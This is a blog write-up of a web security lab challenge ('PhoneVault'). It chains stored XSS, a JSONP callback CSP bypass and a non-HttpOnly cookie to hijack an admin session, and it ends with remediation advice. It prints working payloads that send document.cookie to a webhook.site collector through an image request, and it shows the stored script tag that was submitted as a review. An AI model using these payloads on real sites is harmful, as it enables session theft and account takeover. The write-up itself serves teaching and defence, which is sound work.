---
title: "WebVerse: PhoneVault"
date: 2026-06-13
weight: 4
tags: ["webverse","XSS","CSP"]
author: "Gourav."
showToc: true
TocOpen: false
hidemeta: false
description: "Stored XSS with CSP bypass via JSONP callback injection, leading to admin session hijack."
summary: "Stored XSS with CSP bypass via JSONP callback injection, leading to admin session hijack."
# canonicalURL: "https://canonical.url/to/page"
hideSummary: false
ShowReadingTime: true
ShowPostNavLinks: true
ShowWordCount: true
UseHugoToc: true
cover:
    image: "/images/phonevault_cover.svg"
    alt: "PhoneVault challenge"
    caption: "PhoneVault challenge (Stored XSS / CSP Bypass)"
    relative: false
    hidden: false
---

{{< callout warning >}}

**Lab:** **PhoneVault**

**Category:** Web Security / Client-Side Attacks

**Vulnerability:** Stored **XSS** with **CSP bypass** via JSONP callback injection (session hijack)

**Platform:** webverse
{{< /callout>}}

{{< figure align="center" src="/images/PhoneVault_0.png" caption="PhoneVault Challenge" >}}

## Lab Description

{{< callout insight "Briefing" >}}
*PhoneVault's CTO got a tip from a former contractor: "a regular customer account is enough to pull the moderator's session." Two weeks before launch, she's not taking chances. Sign up, look around, and see if you can reach the admin dashboard.*
{{< /callout>}}

---

## Recon — Browsing the Site

We start by browsing PhoneVault as a guest. It's a normal-looking e-commerce storefront — phones, audio, chargers, cases.

{{< figure align="center" src="/images/PhoneVault_1.png" caption="Homepage" >}}


## Finding the Developer Notes

Looking at the page source, the footer contains a link to {{< badge gray >}}/notes.txt{{< /badge>}} — a leftover developer notes file.

{{< figure align="center" src="/images/PhoneVault_2.png" caption="view-source — /notes.txt link in the footer" >}}

The notes file is a goldmine. It tells us exactly where the weak points are:

{{< figure align="center" src="/images/PhoneVault_3.png" caption="/notes.txt contents" >}}

Three things stand out immediately:

- {{< badge gray >}}/api/products{{< /badge>}} supports a JSONP {{< badge blue >}}callback{{< /badge>}} parameter for the search widget, and **reflects it verbatim with no validation** — the developer assumed the CSP made this harmless.
- Review {{< badge blue >}}content{{< /badge>}} is rendered as **raw HTML**, deprioritized for sanitization because "users must be logged in to post."
- The admin/session cookie is **not** {{< badge red >}}HttpOnly{{< /badge>}} — left off on purpose so the admin dashboard JS can read it.


## Confirming the JSONP Gadget

The header search box fires requests to {{< badge gray >}}/api/products?q=...&callback=...{{< /badge>}}. Testing the search box for "test" shows no results — but the request itself is the interesting part.

{{< figure align="center" src="/images/PhoneVault_4.png" caption="Search widget — 'test' query" >}}

Catching this request in Burp confirms what the notes described: the {{< badge blue >}}callback{{< /badge>}} value ({{< badge gray >}}pvSearch_2{{< /badge>}}) is reflected directly into the JS response, and the response carries a strict CSP — including {{< badge red >}}script-src 'self'{{< /badge>}}, {{< badge red >}}connect-src 'self'{{< /badge>}}, and {{< badge yellow >}}img-src 'self' data: https:{{< /badge>}}.

{{< figure align="center" src="/images/PhoneVault_5.png" caption="Burp — JSONP callback reflected verbatim, CSP headers visible" >}}

This single endpoint is the key to bypassing the CSP later: any {{< badge gray >}}&lt;script src="/api/products?...&callback=ANYTHING"&gt;{{< /badge>}} is a **same-origin** script request, and {{< badge blue >}}ANYTHING{{< /badge>}} becomes the start of the executed JavaScript.


## Registering an Account & Logging In

Reviews require a login, so we register an account.

{{< figure align="center" src="/images/PhoneVault_6.png" caption="Register account 'optional'" >}}

Logging in, we capture the response in Burp and see the session cookie being set:

{{< figure align="center" src="/images/PhoneVault_7.png" caption="POST /login — Set-Cookie: pvtoken=..." >}}

We're now logged in as {{< badge purple >}}optional{{< /badge>}}.

{{< figure align="center" src="/images/PhoneVault_8.png" caption="Logged in as optional" >}}


## Confirming the Stored XSS (Raw HTML Rendering)

Per the dev notes, review content is rendered as raw HTML. We test this on a product page by submitting a review containing an {{< badge gray >}}&lt;h1&gt;{{< /badge>}} tag.

{{< figure align="center" src="/images/PhoneVault_9.png" caption="Submitting <h1>testing</h1> as a review" >}}

The tag is rendered as an actual heading, not as escaped text — confirming the review body is injected into the page unsanitized.

{{< figure align="center" src="/images/PhoneVault_10.png" caption="<h1>testing</h1> rendered as a real heading — stored XSS confirmed" >}}

This alone would normally be game over. But the CSP ({{< badge red >}}script-src 'self'{{< /badge>}}, {{< badge red >}}connect-src 'self'{{< /badge>}}) blocks inline {{< badge gray >}}&lt;script&gt;{{< /badge>}} tags, inline event handlers ({{< badge gray >}}onerror=&hellip;{{< /badge>}}, {{< badge gray >}}onload=&hellip;{{< /badge>}}, etc.), and {{< badge gray >}}fetch{{< /badge>}}/XHR to external hosts — so a classic {{< badge gray >}}&lt;img src=x onerror="fetch(...)"&gt;{{< /badge>}} payload gets stored but never executes.


## Confirming the img-src Exfil Channel

The one CSP directive left wide open is {{< badge yellow >}}img-src 'self' data: https:{{< /badge>}} — any {{< badge gray >}}&lt;img&gt;{{< /badge>}} request to an HTTPS host is allowed, regardless of {{< badge red >}}connect-src{{< /badge>}}. We test this with a plain image tag pointing at our webhook.site collector.

{{< figure align="center" src="/images/PhoneVault_11.png" caption="Submitting an img tag pointing at webhook.site as a review" >}}

When the page loads, the browser fetches the image — confirmed by the request landing on webhook.site, with {{< badge gray >}}Referer: http://phonevault.local/{{< /badge>}}.

{{< figure align="center" src="/images/PhoneVault_12.png" caption="webhook.site — plain <img> request received, img-src https: allowed" >}}

This proves the exfiltration channel works — {{< badge green >}}new Image().src = '&lt;collector&gt;?c=' + document.cookie{{< /badge>}} will reach us, *if* we can get it to execute as JavaScript. The only thing missing is same-origin script execution.


## Building the CSP-Bypass Payload

This is where the JSONP gadget from {{< badge gray >}}/api/products{{< /badge>}} comes in. Because the {{< badge blue >}}callback{{< /badge>}} parameter is reflected verbatim with no validation, we can supply an entire JavaScript IIFE (Immediately Invoked Function Expression) as the "callback name":

```js
(function(){new Image().src='https://7fc130eb-0732-43a9-8c04-eec71ac82259.webhook.site/?cookie='+document.cookie})();//
```

The trailing {{< badge gray >}}//{{< /badge>}} comments out the real {{< badge gray >}}({"products":[...]}){{< /badge>}} JSON body that the endpoint appends, so the response stays syntactically valid JavaScript:

```js
(function(){new Image().src='https://7fc130eb-...webhook.site/?cookie='+document.cookie})();//({"products":[...]});
```

Wrapped in a {{< badge gray >}}&lt;script src="..."&gt;{{< /badge>}} tag pointing at this same-origin endpoint, the browser treats it as a same-origin script — fully compliant with {{< badge red >}}script-src 'self'{{< /badge>}} — while the code itself does whatever we want, including reading {{< badge gray >}}document.cookie{{< /badge>}} and exfiltrating it via the allowed {{< badge yellow >}}img-src https:{{< /badge>}} channel.

We submit this as a review on {{< badge purple >}}/product/3{{< /badge>}}:

```html
<script src="/api/products?q=apple&callback=(function(){new Image().src='https://7fc130eb-0732-43a9-8c04-eec71ac82259.webhook.site/?cookie='+document.cookie})();//"></script>
```

{{< figure align="center" src="/images/PhoneVault_13.png" caption="Submitting the JSONP-gadget XSS payload as a review on /product/3" >}}

Visiting {{< badge purple >}}/product/3{{< /badge>}} ourselves triggers the payload immediately — our own {{< badge gray >}}pvtoken{{< /badge>}} cookie lands on webhook.site, confirming the bypass works end-to-end (own session, {{< badge gray >}}Referer: http://phonevault.local/{{< /badge>}}):

{{< figure align="center" src="/images/PhoneVault_14.png" caption="webhook.site — our own pvtoken received, confirming the payload executes" >}}

## Triggering the Admin Bot

With the payload confirmed and stored on {{< badge purple >}}/product/3{{< /badge>}}, we use the **"Report to Admin"** feature to get an admin-controlled bot to visit the page.

{{< figure align="center" src="/images/PhoneVault_15.png" caption="/report — submitting /product/3" >}}

The report is accepted.

{{< figure align="center" src="/images/PhoneVault_16.png" caption="/report — submission confirmed" >}}

## Catching the Admin's Cookie

A short while later, a second request arrives on webhook.site — this one with {{< badge gray >}}Referer: http://localhost:3000/{{< /badge>}} and from a different IP/location (the admin bot's environment), carrying a **different** {{< badge gray >}}pvtoken{{< /badge>}} value than ours:

{{< figure align="center" src="/images/PhoneVault_17.png" caption="webhook.site — admin bot's pvtoken received via the stored XSS" >}}

## Hijacking the Admin Session

We open a cookie editor in our browser and overwrite our {{< badge gray >}}pvtoken{{< /badge>}} cookie with the value leaked from the admin bot.

{{< figure align="center" src="/images/PhoneVault_18.png" caption="Cookie-Editor — replacing pvtoken with the leaked admin cookie" >}}

Refreshing the page, we're now authenticated as {{< badge red >}}admin{{< /badge>}}, with a new **Admin** button in the header. Opening the admin panel reveals the flag, along with the stored review containing our payload in the "Recent Reviews" table — proof of exactly how we got there.

{{< figure align="center" src="/images/PhoneVault_19.png" caption="Admin panel — flag retrieved" >}}

---

## Why This Works

This challenge chains three separate weaknesses, each individually "minor," into a full account takeover:

1. **Stored XSS (raw HTML rendering).** Review content is inserted into the page without any sanitization or escaping. Any HTML or {{< badge gray >}}&lt;script&gt;{{< /badge>}} tag submitted in a review becomes part of the page for every visitor.

2. **CSP bypass via JSONP callback injection.** A strict {{< badge red >}}script-src 'self'{{< /badge>}} policy normally stops inline scripts and inline event handlers from running, which is why a naive {{< badge gray >}}&lt;img onerror="..."&gt;{{< /badge>}} payload is rendered but never fires. However, {{< badge gray >}}/api/products?callback=...{{< /badge>}} reflects the {{< badge blue >}}callback{{< /badge>}} parameter into a same-origin {{< badge gray >}}application/javascript{{< /badge>}} response with zero validation. By supplying a full IIFE as the callback name and appending {{< badge gray >}}//{{< /badge>}} to comment out the trailing JSON, an attacker can smuggle arbitrary JavaScript through a {{< badge gray >}}&lt;script src="/api/products?..."&gt;{{< /badge>}} tag — which the browser treats as same-origin and therefore CSP-compliant.

3. **Exfiltration via the one open channel.** {{< badge red >}}connect-src 'self'{{< /badge>}} blocks {{< badge gray >}}fetch{{< /badge>}}/XHR to external hosts, but {{< badge yellow >}}img-src 'self' data: https:{{< /badge>}} allows image loads to *any* HTTPS host. {{< badge green >}}new Image().src = '&lt;collector&gt;?cookie=' + document.cookie{{< /badge>}} slips through this gap entirely.

4. **Missing HttpOnly on the session cookie.** Even with the XSS and CSP bypass in place, {{< badge gray >}}document.cookie{{< /badge>}} would return nothing useful if {{< badge gray >}}pvtoken{{< /badge>}} were {{< badge red >}}HttpOnly{{< /badge>}}. Because it isn't, the script can read and exfiltrate it directly.

5. **The admin bot ({{< badge purple >}}/report{{< /badge>}})** provides the trigger: it guarantees an authenticated, privileged browser will visit attacker-controlled stored content, turning a self-XSS-style proof of concept into a real session theft against the admin account.

## Remediation

| Issue | Fix |
| --- | --- |
| Review content rendered as raw, unsanitized HTML | Sanitize all user-supplied HTML with a library such as DOMPurify before rendering, or render as plain text and apply formatting via a safe markup subset |
| `/api/products` reflects the `callback` parameter verbatim | Strictly whitelist the callback name (e.g. `^[A-Za-z_$][\w$]*$`) and reject anything else — this closes the CSP-bypass gadget even if other XSS exists |
| Session cookie (`pvtoken`) missing `HttpOnly` | Set `HttpOnly` on all session/authentication cookies so they cannot be read via `document.cookie` |
| `img-src` permits arbitrary HTTPS hosts | Restrict `img-src` to `'self'` and any specific, trusted CDNs only — avoid broad `https:` wildcards |
| Admin bot visits attacker-influenced URLs with a live session | Run report-review bots in an isolated context with no access to privileged session cookies, or require manual admin review |

---

{{< callout tip "The takeaway">}}

A Content-Security-Policy is only as strong as every endpoint it implicitly trusts. {{< badge red >}}script-src 'self'{{< /badge>}} does not mean "no XSS is possible" — it means *only same-origin-served script can execute*. Any same-origin endpoint that reflects attacker-controlled input into a JavaScript or JSONP response, without strict validation, becomes a gadget that turns a CSP-blocked inline-XSS into fully CSP-compliant code execution. Combine that with a non-HttpOnly session cookie and an admin bot that can be pointed at attacker content, and a single "low priority" TODO item becomes a full account takeover.

*Do this lab on webverse Now:* https://dashboard.webverselabs-pro.com/labs/phonevault
{{< /callout>}}